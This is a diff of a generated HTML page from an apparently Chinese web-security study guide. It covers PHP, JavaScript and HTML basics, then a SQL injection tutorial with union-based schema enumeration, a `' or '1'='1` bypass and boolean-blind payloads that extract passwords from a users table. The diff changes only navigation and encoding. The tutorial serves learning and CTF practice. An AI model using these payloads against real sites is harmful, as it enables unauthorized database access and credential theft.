@@ -418,6 +418,8 @@
       
         
       
+        
+      
     
     
       
@@ -922,6 +924,65 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../ADS/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    DS
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            DS
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -947,16 +1008,16 @@
   
 
 
-<h1 id="web">Web<a class="headerlink" href="#web" title="Permanent link">&para;</a></h1>
+<div><h1 id="web">Web<a class="headerlink" href="#web" title="Permanent link">¶</a></h1>
 <p>Web可以简单地划分为前端和后端。简单来说，Web方向的工作是通过查找前端中的代码从而寻找并攻破后端。</p>
-<h2 id="_1">常用工具<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_1">常用工具<a class="headerlink" href="#_1" title="Permanent link">¶</a></h2>
 <ul>
 <li>phpstudy：可用于快速搭建本地web服务器，集成了很多web需要用的工具。</li>
 <li>Node.js：一个轻量高效的Javascript运行环境。</li>
 </ul>
-<h2 id="php">PHP<a class="headerlink" href="#php" title="Permanent link">&para;</a></h2>
+<h2 id="php">PHP<a class="headerlink" href="#php" title="Permanent link">¶</a></h2>
 <p>一门早期web开发语言，可使用phpstudy快速地完成环境配置。</p>
-<h3 id="php_1">示例：PHP<a class="headerlink" href="#php_1" title="Permanent link">&para;</a></h3>
+<h3 id="php_1">示例：PHP<a class="headerlink" href="#php_1" title="Permanent link">¶</a></h3>
 <details class="example">
 <summary>Example</summary>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
@@ -1033,51 +1094,51 @@
 <a id="__codelineno-0-15" name="__codelineno-0-15"></a>
 <a id="__codelineno-0-16" name="__codelineno-0-16"></a>    <span class="c1">// 方法：显示用户信息</span>
 <a id="__codelineno-0-17" name="__codelineno-0-17"></a>    <span class="k">public</span> <span class="k">function</span> <span class="nf">displayUserInfo</span><span class="p">()</span> <span class="p">{</span>
-<a id="__codelineno-0-18" name="__codelineno-0-18"></a>        <span class="k">echo</span> <span class="s2">&quot;Name: &quot;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">.</span> <span class="s2">&quot;, Email: &quot;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">email</span> <span class="o">.</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
+<a id="__codelineno-0-18" name="__codelineno-0-18"></a>        <span class="k">echo</span> <span class="s2">"Name: "</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">.</span> <span class="s2">", Email: "</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">email</span> <span class="o">.</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
 <a id="__codelineno-0-19" name="__codelineno-0-19"></a>    <span class="p">}</span>
 <a id="__codelineno-0-20" name="__codelineno-0-20"></a><span class="p">}</span>
 <a id="__codelineno-0-21" name="__codelineno-0-21"></a>
 <a id="__codelineno-0-22" name="__codelineno-0-22"></a><span class="c1">// 继承User类创建一个管理员类</span>
 <a id="__codelineno-0-23" name="__codelineno-0-23"></a><span class="k">class</span> <span class="nc">Admin</span> <span class="k">extends</span> <span class="nx">User</span> <span class="p">{</span>
 <a id="__codelineno-0-24" name="__codelineno-0-24"></a>    <span class="c1">// 管理员特有的属性</span>
-<a id="__codelineno-0-25" name="__codelineno-0-25"></a>    <span class="k">public</span> <span class="nv">$role</span> <span class="o">=</span> <span class="s2">&quot;Administrator&quot;</span><span class="p">;</span>
+<a id="__codelineno-0-25" name="__codelineno-0-25"></a>    <span class="k">public</span> <span class="nv">$role</span> <span class="o">=</span> <span class="s2">"Administrator"</span><span class="p">;</span>
 <a id="__codelineno-0-26" name="__codelineno-0-26"></a>
 <a id="__codelineno-0-27" name="__codelineno-0-27"></a>    <span class="c1">// 重写方法：显示用户信息</span>
 <a id="__codelineno-0-28" name="__codelineno-0-28"></a>    <span class="k">public</span> <span class="k">function</span> <span class="nf">displayUserInfo</span><span class="p">()</span> <span class="p">{</span>
-<a id="__codelineno-0-29" name="__codelineno-0-29"></a>        <span class="k">echo</span> <span class="s2">&quot;Name: &quot;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">.</span> <span class="s2">&quot;, Email: &quot;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">email</span> <span class="o">.</span> <span class="s2">&quot;, Role: &quot;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">role</span> <span class="o">.</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
+<a id="__codelineno-0-29" name="__codelineno-0-29"></a>        <span class="k">echo</span> <span class="s2">"Name: "</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">.</span> <span class="s2">", Email: "</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">email</span> <span class="o">.</span> <span class="s2">", Role: "</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">role</span> <span class="o">.</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
 <a id="__codelineno-0-30" name="__codelineno-0-30"></a>    <span class="p">}</span>
 <a id="__codelineno-0-31" name="__codelineno-0-31"></a><span class="p">}</span>
 <a id="__codelineno-0-32" name="__codelineno-0-32"></a>
 <a id="__codelineno-0-33" name="__codelineno-0-33"></a><span class="c1">// 使用User类创建一个对象</span>
-<a id="__codelineno-0-34" name="__codelineno-0-34"></a><span class="nv">$user1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="s2">&quot;John Doe&quot;</span><span class="p">,</span> <span class="s2">&quot;john@example.com&quot;</span><span class="p">);</span>
+<a id="__codelineno-0-34" name="__codelineno-0-34"></a><span class="nv">$user1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="s2">"John Doe"</span><span class="p">,</span> <span class="s2">"john@example.com"</span><span class="p">);</span>
 <a id="__codelineno-0-35" name="__codelineno-0-35"></a><span class="nv">$user1</span><span class="o">-&gt;</span><span class="na">displayUserInfo</span><span class="p">();</span>
 <a id="__codelineno-0-36" name="__codelineno-0-36"></a>
 <a id="__codelineno-0-37" name="__codelineno-0-37"></a><span class="c1">// 使用Admin类创建一个对象</span>
-<a id="__codelineno-0-38" name="__codelineno-0-38"></a><span class="nv">$admin1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Admin</span><span class="p">(</span><span class="s2">&quot;Jane Doe&quot;</span><span class="p">,</span> <span class="s2">&quot;jane@example.com&quot;</span><span class="p">);</span>
+<a id="__codelineno-0-38" name="__codelineno-0-38"></a><span class="nv">$admin1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Admin</span><span class="p">(</span><span class="s2">"Jane Doe"</span><span class="p">,</span> <span class="s2">"jane@example.com"</span><span class="p">);</span>
 <a id="__codelineno-0-39" name="__codelineno-0-39"></a><span class="nv">$admin1</span><span class="o">-&gt;</span><span class="na">displayUserInfo</span><span class="p">();</span>
 <a id="__codelineno-0-40" name="__codelineno-0-40"></a>
 <a id="__codelineno-0-41" name="__codelineno-0-41"></a><span class="c1">// 使用循环和条件语句</span>
 <a id="__codelineno-0-42" name="__codelineno-0-42"></a><span class="nv">$users</span> <span class="o">=</span> <span class="p">[</span><span class="nv">$user1</span><span class="p">,</span> <span class="nv">$admin1</span><span class="p">];</span>
 <a id="__codelineno-0-43" name="__codelineno-0-43"></a><span class="k">foreach</span> <span class="p">(</span><span class="nv">$users</span> <span class="k">as</span> <span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
 <a id="__codelineno-0-44" name="__codelineno-0-44"></a>    <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="nx">instanceof</span> <span class="nx">Admin</span><span class="p">)</span> <span class="p">{</span>
-<a id="__codelineno-0-45" name="__codelineno-0-45"></a>        <span class="k">echo</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">.</span> <span class="s2">&quot; is an admin.&lt;br&gt;&quot;</span><span class="p">;</span>
+<a id="__codelineno-0-45" name="__codelineno-0-45"></a>        <span class="k">echo</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">.</span> <span class="s2">" is an admin.&lt;br&gt;"</span><span class="p">;</span>
 <a id="__codelineno-0-46" name="__codelineno-0-46"></a>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-<a id="__codelineno-0-47" name="__codelineno-0-47"></a>        <span class="k">echo</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">.</span> <span class="s2">&quot; is a regular user.&lt;br&gt;&quot;</span><span class="p">;</span>
+<a id="__codelineno-0-47" name="__codelineno-0-47"></a>        <span class="k">echo</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">.</span> <span class="s2">" is a regular user.&lt;br&gt;"</span><span class="p">;</span>
 <a id="__codelineno-0-48" name="__codelineno-0-48"></a>    <span class="p">}</span>
 <a id="__codelineno-0-49" name="__codelineno-0-49"></a><span class="p">}</span>
 <a id="__codelineno-0-50" name="__codelineno-0-50"></a>
 <a id="__codelineno-0-51" name="__codelineno-0-51"></a><span class="c1">// 使用数组</span>
 <a id="__codelineno-0-52" name="__codelineno-0-52"></a><span class="nv">$numbers</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">];</span>
-<a id="__codelineno-0-53" name="__codelineno-0-53"></a><span class="k">echo</span> <span class="s2">&quot;Sum: &quot;</span> <span class="o">.</span> <span class="nb">array_sum</span><span class="p">(</span><span class="nv">$numbers</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
+<a id="__codelineno-0-53" name="__codelineno-0-53"></a><span class="k">echo</span> <span class="s2">"Sum: "</span> <span class="o">.</span> <span class="nb">array_sum</span><span class="p">(</span><span class="nv">$numbers</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
 <a id="__codelineno-0-54" name="__codelineno-0-54"></a>
 <a id="__codelineno-0-55" name="__codelineno-0-55"></a><span class="c1">// 使用字符串函数</span>
-<a id="__codelineno-0-56" name="__codelineno-0-56"></a><span class="nv">$greeting</span> <span class="o">=</span> <span class="s2">&quot;Hello, World!&quot;</span><span class="p">;</span>
-<a id="__codelineno-0-57" name="__codelineno-0-57"></a><span class="k">echo</span> <span class="s2">&quot;Reversed greeting: &quot;</span> <span class="o">.</span> <span class="nb">strrev</span><span class="p">(</span><span class="nv">$greeting</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
+<a id="__codelineno-0-56" name="__codelineno-0-56"></a><span class="nv">$greeting</span> <span class="o">=</span> <span class="s2">"Hello, World!"</span><span class="p">;</span>
+<a id="__codelineno-0-57" name="__codelineno-0-57"></a><span class="k">echo</span> <span class="s2">"Reversed greeting: "</span> <span class="o">.</span> <span class="nb">strrev</span><span class="p">(</span><span class="nv">$greeting</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
 <a id="__codelineno-0-58" name="__codelineno-0-58"></a><span class="cp">?&gt;</span>
 </code></pre></div></td></tr></table></div>
 </details>
 <p>不需要会写，但需要能够读懂大部分的语句。详细教程可看：<a href="https://www.runoob.com/php/php-tutorial.html">PHP|菜鸟教程</a></p>
-<h3 id="_2">安装与版本切换<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<h3 id="_2">安装与版本切换<a class="headerlink" href="#_2" title="Permanent link">¶</a></h3>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
 <span class="normal"><a href="#__codelineno-1-2"> 2</a></span>
 <span class="normal"><a href="#__codelineno-1-3"> 3</a></span>
@@ -1102,9 +1163,9 @@
 <a id="__codelineno-1-11" name="__codelineno-1-11"></a><span class="c1"># Switch the version</span>
 <a id="__codelineno-1-12" name="__codelineno-1-12"></a>sudo<span class="w"> </span>update-alternatives<span class="w"> </span>--config<span class="w"> </span>php
 </code></pre></div></td></tr></table></div>
-<h2 id="javascript">Javascript<a class="headerlink" href="#javascript" title="Permanent link">&para;</a></h2>
+<h2 id="javascript">Javascript<a class="headerlink" href="#javascript" title="Permanent link">¶</a></h2>
 <p>JavaScript 是一种高级的、解释执行的编程语言，它是网页开发的核心技术之一。</p>
-<h3 id="javascript_1">示例：Javascript<a class="headerlink" href="#javascript_1" title="Permanent link">&para;</a></h3>
+<h3 id="javascript_1">示例：Javascript<a class="headerlink" href="#javascript_1" title="Permanent link">¶</a></h3>
 <details class="example">
 <summary>Example</summary>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
@@ -1198,16 +1259,16 @@
 <a id="__codelineno-2-42" name="__codelineno-2-42"></a>
 <a id="__codelineno-2-43" name="__codelineno-2-43"></a><span class="c1">// 使用示例</span>
 <a id="__codelineno-2-44" name="__codelineno-2-44"></a><span class="kd">const</span><span class="w"> </span><span class="nx">myTodoManager</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">TodoManager</span><span class="p">();</span>
-<a id="__codelineno-2-45" name="__codelineno-2-45"></a><span class="nx">myTodoManager</span><span class="p">.</span><span class="nx">addTodo</span><span class="p">(</span><span class="s2">&quot;Learn JavaScript&quot;</span><span class="p">);</span>
-<a id="__codelineno-2-46" name="__codelineno-2-46"></a><span class="nx">myTodoManager</span><span class="p">.</span><span class="nx">addTodo</span><span class="p">(</span><span class="s2">&quot;Read a book&quot;</span><span class="p">);</span>
+<a id="__codelineno-2-45" name="__codelineno-2-45"></a><span class="nx">myTodoManager</span><span class="p">.</span><span class="nx">addTodo</span><span class="p">(</span><span class="s2">"Learn JavaScript"</span><span class="p">);</span>
+<a id="__codelineno-2-46" name="__codelineno-2-46"></a><span class="nx">myTodoManager</span><span class="p">.</span><span class="nx">addTodo</span><span class="p">(</span><span class="s2">"Read a book"</span><span class="p">);</span>
 <a id="__codelineno-2-47" name="__codelineno-2-47"></a><span class="nx">myTodoManager</span><span class="p">.</span><span class="nx">completeTodo</span><span class="p">(</span><span class="mf">0</span><span class="p">);</span><span class="w"> </span><span class="c1">// 标记第一个待办事项为完成</span>
 <a id="__codelineno-2-48" name="__codelineno-2-48"></a><span class="nx">myTodoManager</span><span class="p">.</span><span class="nx">displayTodos</span><span class="p">();</span><span class="w"> </span><span class="c1">// 显示所有待办事项</span>
 </code></pre></div></td></tr></table></div>
 </details>
 <p>详细教程可看：<a href="https://www.runoob.com/js/js-tutorial.html">Javascript|菜鸟教程</a></p>
-<h2 id="htmlcss">HTML和CSS<a class="headerlink" href="#htmlcss" title="Permanent link">&para;</a></h2>
+<h2 id="htmlcss">HTML和CSS<a class="headerlink" href="#htmlcss" title="Permanent link">¶</a></h2>
 <p>在网页的显示中，HTML 负责网页的结构和内容， CSS 负责网页的布局和外观设计。想要了解网页功能，我们会更加关注HTML部分，需要熟悉掌握语法。</p>
-<h3 id="html">示例：HTML<a class="headerlink" href="#html" title="Permanent link">&para;</a></h3>
+<h3 id="html">示例：HTML<a class="headerlink" href="#html" title="Permanent link">¶</a></h3>
 <details class="example">
 <summary>Example</summary>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
@@ -1234,9 +1295,9 @@
 <span class="normal"><a href="#__codelineno-3-22">22</a></span>
 <span class="normal"><a href="#__codelineno-3-23">23</a></span>
 <span class="normal"><a href="#__codelineno-3-24">24</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="cp">&lt;!DOCTYPE html&gt;</span>
-<a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&quot;zh-cn&quot;</span><span class="p">&gt;</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">"zh-cn"</span><span class="p">&gt;</span>
 <a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
-<a id="__codelineno-3-4" name="__codelineno-3-4"></a>    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span><span class="p">&gt;</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4"></a>    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"UTF-8"</span><span class="p">&gt;</span>
 <a id="__codelineno-3-5" name="__codelineno-3-5"></a>    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>我的网页<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
 <a id="__codelineno-3-6" name="__codelineno-3-6"></a>    <span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
 <a id="__codelineno-3-7" name="__codelineno-3-7"></a><span class="w">        </span><span class="nt">body</span><span class="w"> </span><span class="p">{</span>
@@ -1254,22 +1315,22 @@
 <a id="__codelineno-3-19" name="__codelineno-3-19"></a>    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>欢迎来到我的网页<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
 <a id="__codelineno-3-20" name="__codelineno-3-20"></a>    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>这是一个简单的HTML示例。<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
 <a id="__codelineno-3-21" name="__codelineno-3-21"></a>    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>HTML帮助你创建网页结构。<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
-<a id="__codelineno-3-22" name="__codelineno-3-22"></a>    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;https://www.example.com&quot;</span><span class="p">&gt;</span>访问我的链接<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+<a id="__codelineno-3-22" name="__codelineno-3-22"></a>    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"https://www.example.com"</span><span class="p">&gt;</span>访问我的链接<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
 <a id="__codelineno-3-23" name="__codelineno-3-23"></a><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
 <a id="__codelineno-3-24" name="__codelineno-3-24"></a><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
 </code></pre></div></td></tr></table></div>
 </details>
 <p>详细的教程还请查看：<a href="https://www.runoob.com/html/html-tutorial.html">HTML|菜鸟教程</a></p>
-<h2 id="sql">SQL注入<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h2>
+<h2 id="sql">SQL注入<a class="headerlink" href="#sql" title="Permanent link">¶</a></h2>
 <p>SQL注入（SQL Injection）是一种常见的网络安全漏洞，攻击者通过在输入字段中插入恶意的SQL代码，来操纵数据库查询，从而获取、修改或删除数据库中的数据。SQL注入攻击通常发生在应用程序没有正确处理用户输入的情况下。</p>
 <p>常用的工具有Burp Suite和Sqlmap，前者用于抓包，后者用于自动化注入。</p>
-<h3 id="_3">基础注入<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<h3 id="_3">基础注入<a class="headerlink" href="#_3" title="Permanent link">¶</a></h3>
 <p>根据网站功能猜测 Sql语句：</p>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
 <span class="normal"><a href="#__codelineno-4-2">2</a></span>
 <span class="normal"><a href="#__codelineno-4-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">column1</span><span class="p">,</span><span class="w"> </span><span class="n">column2</span><span class="p">,</span><span class="w"> </span><span class="p">...</span>
 <a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span>
-<a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">condition</span><span class="p">;</span><span class="cm">/* id = num or id = &#39;num&#39; 数字型和字符型 */</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">condition</span><span class="p">;</span><span class="cm">/* id = num or id = 'num' 数字型和字符型 */</span>
 </code></pre></div></td></tr></table></div>
 <p>构造<strong>运算式</strong>来判断是数字型还是字符型，如 1 和 2 - 1；或分别输入奇数个和偶数个<strong>引号</strong>看是否报错。</p>
 <p>联合查询：<code>UNION SELECT （） FROM table_name</code>前后列数必须一致：</p>
@@ -1294,10 +1355,10 @@
 <span class="normal"><a href="#__codelineno-6-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="err">在</span><span class="n">MySQL中</span><span class="err">，所有的数据库名存放在</span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata的schema_name字段下</span>
 <a id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">schema_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="p">;</span>
 <a id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="err">所有的表名存放在</span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables的table_name字段下</span><span class="err">，可以以</span><span class="n">table_schema为条件筛选</span>
-<a id="__codelineno-6-4" name="__codelineno-6-4"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;db_name&#39;</span><span class="p">;</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">'db_name'</span><span class="p">;</span>
 <a id="__codelineno-6-5" name="__codelineno-6-5"></a><span class="err">所有的列名存放在</span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns的column_name字段下</span><span class="err">，可以以</span><span class="n">table_schema和table_name为条件筛选</span>
-<a id="__codelineno-6-6" name="__codelineno-6-6"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;table_name&#39;</span><span class="w"> </span>
-<a id="__codelineno-6-7" name="__codelineno-6-7"></a><span class="k">AND</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;db_name&#39;</span><span class="p">;</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">'table_name'</span><span class="w"> </span>
+<a id="__codelineno-6-7" name="__codelineno-6-7"></a><span class="k">AND</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">'db_name'</span><span class="p">;</span>
 <a id="__codelineno-6-8" name="__codelineno-6-8"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">col_name1</span><span class="p">,</span><span class="w"> </span><span class="err">…</span><span class="p">,</span><span class="w"> </span><span class="n">col_nameN</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span>
 <a id="__codelineno-6-9" name="__codelineno-6-9"></a><span class="n">group_concat</span><span class="p">(</span><span class="k">schema_name</span><span class="p">),</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="p">;</span>
 <a id="__codelineno-6-10" name="__codelineno-6-10"></a><span class="err">获取所有数据库信息，以此类推</span>
@@ -1310,41 +1371,41 @@
 </code></pre></div></td></tr></table></div>
 <p><code>SELECT * FROM</code>'users' <code>WHERE username = 'ro' 'ot'</code>也能输出user found：语法会自动拼接字符串，中间要隔一个空格。</p>
 <p>user.php?uname=NotaUser' or '1' = '1:可以拼接成完整的bool语句。</p>
-<p><img alt="1720509421214" src="../image/Web/1720509421214.png" /></p>
+<p><img alt="1720509421214" src="../image/Web/1720509421214.png"></p>
 <div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
 <span class="normal"><a href="#__codelineno-7-2">2</a></span>
 <span class="normal"><a href="#__codelineno-7-3">3</a></span>
 <span class="normal"><a href="#__codelineno-7-4">4</a></span>
-<span class="normal"><a href="#__codelineno-7-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a>uname=a&#39; or ASCII(SUBSTR(DATABASE(), 1, 1))&gt;0#
-<a id="__codelineno-7-2" name="__codelineno-7-2"></a>SELECT col_name(…) FROM table_name WHERE username = &#39;a&#39; or ASCII(SUBSTR(DATABASE(), 1, 1))&gt;0#&#39;
+<span class="normal"><a href="#__codelineno-7-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a>uname=a' or ASCII(SUBSTR(DATABASE(), 1, 1))&gt;0#
+<a id="__codelineno-7-2" name="__codelineno-7-2"></a>SELECT col_name(…) FROM table_name WHERE username = 'a' or ASCII(SUBSTR(DATABASE(), 1, 1))&gt;0#'
 <a id="__codelineno-7-3" name="__codelineno-7-3"></a>返回User Found，说明DATABASE()的第一位的ASCII码&gt;0
 <a id="__codelineno-7-4" name="__codelineno-7-4"></a>
-<a id="__codelineno-7-5" name="__codelineno-7-5"></a>SELECT col_name(…) FROM table_name WHERE username = &#39;a&#39; or ASCII(SUBSTR((SELECT GROUP_CONCAT(passwd) FROM users), 1, 1))&gt;0#&#39;
+<a id="__codelineno-7-5" name="__codelineno-7-5"></a>SELECT col_name(…) FROM table_name WHERE username = 'a' or ASCII(SUBSTR((SELECT GROUP_CONCAT(passwd) FROM users), 1, 1))&gt;0#'
 </code></pre></div></td></tr></table></div>
 <p>利用响应时间获得数据：IF(condition, expr1, expr2)
 如果condition为真就执行expr1，反之执行expr2，在expr里使用不同的延时sleep(time)就能获得结果，为了保证能够运行，中间的连接使用AND，因为sql也会截短运行，在保证前面是正确的情况下，后面的语句一定会执行。</p>
-<h3 id="_4">特殊注入<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<h3 id="_4">特殊注入<a class="headerlink" href="#_4" title="Permanent link">¶</a></h3>
 <p>INSERT, UPDATE, DELETE语句的注入：</p>
